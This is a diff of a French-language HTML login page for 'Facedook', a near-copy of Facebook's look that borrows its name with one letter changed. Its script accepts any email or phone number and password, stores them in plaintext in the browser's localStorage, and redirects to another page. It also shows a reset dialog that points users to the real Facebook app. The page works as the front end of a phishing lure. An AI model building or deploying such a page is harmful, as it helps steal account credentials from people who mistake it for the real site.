@@ -1,176 +1,258 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facedook Login Page</title>
-    <style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facedook Login Page</title>
+  <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
 
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-  font-family: 'Roboto', sans-serif;
-}
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+    }
 
-/* Conteneur principal centré verticalement et horizontalement */
-.container {
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  padding: 0 15px;
-  min-height: 100vh;
-  background: #f0f2f5;
-}
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 0 15px;
+      min-height: 100vh;
+      background: #f0f2f5;
+    }
 
-/* Zone de la page Facedook */
-.facebook-page {
-  display: flex;
-  flex-wrap: wrap;
-  align-items: center;
-  justify-content: center;
-  max-width: 1000px;
-  width: 100%;
-}
+    .facebook-page {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: center;
+      max-width: 1000px;
+      width: 100%;
+    }
 
-/* Zone de texte en haut */
-.facebook-page .text {
-  text-align: center;
-  margin-bottom: 30px;
-  flex: 1 1 300px;
-}
+    .facebook-page .text {
+      text-align: center;
+      margin-bottom: 30px;
+      flex: 1 1 300px;
+    }
 
-.facebook-page h1 {
-  color: #1877f2;
-  font-size: 4rem;
-  margin-bottom: 10px;
-}
+    .facebook-page h1 {
+      color: #1877f2;
+      font-size: 4rem;
+      margin-bottom: 10px;
+    }
 
-.facebook-page p {
-  font-size: 1.75rem;
-  white-space: nowrap;
-}
+    .facebook-page p {
+      font-size: 1.75rem;
+      white-space: nowrap;
+    }
 
-/* Formulaire de connexion */
-form {
-  display: flex;
-  flex-direction: column;
-  background: #fff;
-  border-radius: 8px;
-  padding: 20px;
-  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
-              0 8px 16px rgba(0, 0, 0, 0.1);
-  max-width: 400px;
-  width: 100%;
-  flex: 1 1 300px;
-}
+    form {
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+      border-radius: 8px;
+      padding: 20px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
+                  0 8px 16px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      width: 100%;
+      flex: 1 1 300px;
+      position: relative;
+    }
 
-form input {
-  height: 55px;
-  width: 100%;
-  border: 1px solid #ccc;
-  border-radius: 6px;
-  margin-bottom: 15px;
-  font-size: 1rem;
-  padding: 0 14px;
-}
+    form input {
+      height: 55px;
+      width: 100%;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 15px;
+      font-size: 1rem;
+      padding: 0 14px;
+    }
 
-form input:focus {
-  outline: none;
-  border-color: #1877f2;
-}
+    form input:focus {
+      outline: none;
+      border-color: #1877f2;
+    }
 
-::placeholder {
-  color: #777;
-  font-size: 1.063rem;
-}
+    ::placeholder {
+      color: #777;
+      font-size: 1.063rem;
+    }
 
-/* Bouton de connexion et conteneur de liens */
-.link {
-  display: flex;
-  flex-direction: column;
-  text-align: center;
-  gap: 15px;
-}
+    /* Conteneur pour le champ du mot de passe avec l'icône */
+    .password-container {
+      position: relative;
+    }
 
-.link .login {
-  border: none;
-  cursor: pointer;
-  background: #1877f2;
-  padding: 15px 0;
-  border-radius: 6px;
-  color: #fff;
-  font-size: 1.25rem;
-  font-weight: 600;
-  transition: background 0.2s ease;
-}
+    .password-container svg {
+      position: absolute;
+      top: 50%;
+      right: 14px;
+      transform: translateY(-50%);
+      cursor: pointer;
+      fill: #777;
+      width: 24px;
+      height: 24px;
+    }
 
-.link .login:hover {
-  background: #0d65d9;
-}
+    .link {
+      display: flex;
+      flex-direction: column;
+      text-align: center;
+      gap: 15px;
+    }
 
-/* Responsive */
-@media (max-width: 900px) {
-  .facebook-page {
-    flex-direction: column;
-    text-align: center;
-  }
-  .facebook-page .text {
-    margin-bottom: 20px;
-  }
-}
+    .link .login {
+      border: none;
+      cursor: pointer;
+      background: #1877f2;
+      padding: 15px 0;
+      border-radius: 6px;
+      color: #fff;
+      font-size: 1.25rem;
+      font-weight: 600;
+      transition: background 0.2s ease;
+    }
 
-@media (max-width: 460px) {
-  .facebook-page h1 {
-    font-size: 3.5rem;
-  }
-  .facebook-page p {
-    font-size: 1.3rem;
-  }
-  form {
-    padding: 15px;
-  }
-}
-</style>
+    .link .login:hover {
+      background: #0d65d9;
+    }
+
+    .forgot-link {
+      font-size: 0.9rem;
+      color: #1877f2;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+
+    /* Style pour la boîte de dialogue */
+    dialog {
+      border: none;
+      border-radius: 8px;
+      padding: 20px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+    }
+    dialog::backdrop {
+      background: rgba(0, 0, 0, 0.4);
+    }
+    .dialog-close {
+      display: inline-block;
+      margin-top: 15px;
+      padding: 8px 15px;
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    /* Responsive */
+    @media (max-width: 900px) {
+      .facebook-page {
+        flex-direction: column;
+        text-align: center;
+      }
+      .facebook-page .text {
+        margin-bottom: 20px;
+      }
+    }
+    @media (max-width: 460px) {
+      .facebook-page h1 {
+        font-size: 3.5rem;
+      }
+      .facebook-page p {
+        font-size: 1.3rem;
+      }
+      form {
+        padding: 15px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="container flex">
-        <div class="facebook-page flex">
-            <div class="text">
-                <h1>facedook</h1>
-                <p>Connect with friends and the world</p>
-                <p>around you on Facedook.</p>
-            </div>
-            <form id="loginForm">
-                <input type="text" id="emailOrNum" placeholder="Email ou numéro de téléphone" required>
-                <input type="password" id="password" placeholder="Mot de passe" required>
-                <div class="link">
-                    <button type="submit" class="login">Log-in</button>
-                </div>
-            </form>
+  <div class="container">
+    <div class="facebook-page">
+      <div class="text">
+        <h1>facedook</h1>
+        <p>Connect with friends and the world</p>
+        <p>around you on Facedook.</p>
+      </div>
+      <form id="loginForm">
+        <input type="text" id="emailOrNum" placeholder="Email ou numéro de téléphone" required>
+        <div class="password-container">
+          <input type="password" id="password" placeholder="Mot de passe" required>
+          <!-- Icône œil SVG -->
+          <svg id="togglePassword" viewBox="0 0 24 24">
+            <path d="M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
         </div>
+        <div class="link">
+          <button type="submit" class="login">Log-in</button>
+          <a class="forgot-link" id="forgotPasswordLink">forget password</a>
+        </div>
+      </form>
     </div>
+  </div>
 
-    <script>
-        document.getElementById("loginForm").addEventListener("submit", function(event) {
-            event.preventDefault();
+  <!-- Boîte de dialogue pour la réinitialisation du mot de passe -->
+  <dialog id="forgotPasswordDialog">
+    <h2>Réinitialisation du mot de passe</h2>
+    <p>
+      Ouvrez Facebook sur votre téléphone et, dans le menu, sélectionnez "Mot de passe oublié" pour réinitialiser votre mot de passe.
+    </p>
+    <button class="dialog-close" id="closeDialog">Fermer</button>
+  </dialog>
 
-            let emailOrNum = document.getElementById("emailOrNum").value.trim();
-            let password = document.getElementById("password").value;
+  <script>
+    // Toggle pour afficher/cacher le mot de passe
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
 
-            if (!emailOrNum || !password) {
-                alert("Veuillez remplir tous les champs !");
-                return;
-            }
+    togglePassword.addEventListener('click', () => {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      togglePassword.style.fill = type === 'password' ? '#777' : '#1877f2';
+    });
 
-            localStorage.setItem("emailOrNum", emailOrNum);
-            localStorage.setItem("password", password);
-            localStorage.setItem("level", "N/A");
-            localStorage.setItem("id", "N/A");
+    // Gestion du formulaire de connexion
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+      let emailOrNum = document.getElementById("emailOrNum").value.trim();
+      let password = document.getElementById("password").value;
 
-            window.location.href = "loi.html";
-        });
-    </script>
+      if (!emailOrNum || !password) {
+        alert("Veuillez remplir tous les champs !");
+        return;
+      }
+
+      localStorage.setItem("emailOrNum", emailOrNum);
+      localStorage.setItem("password", password);
+      localStorage.setItem("level", "N/A");
+      localStorage.setItem("id", "N/A");
+
+      window.location.href = "loi.html";
+    });
+
+    // Gestion du lien "forget password"
+    const forgotPasswordLink = document.getElementById('forgotPasswordLink');
+    const forgotPasswordDialog = document.getElementById('forgotPasswordDialog');
+    const closeDialog = document.getElementById('closeDialog');
+
+    forgotPasswordLink.addEventListener('click', () => {
+      forgotPasswordDialog.showModal();
+    });
+
+    closeDialog.addEventListener('click', () => {
+      forgotPasswordDialog.close();
+    });
+  </script>
 </body>
 </html>
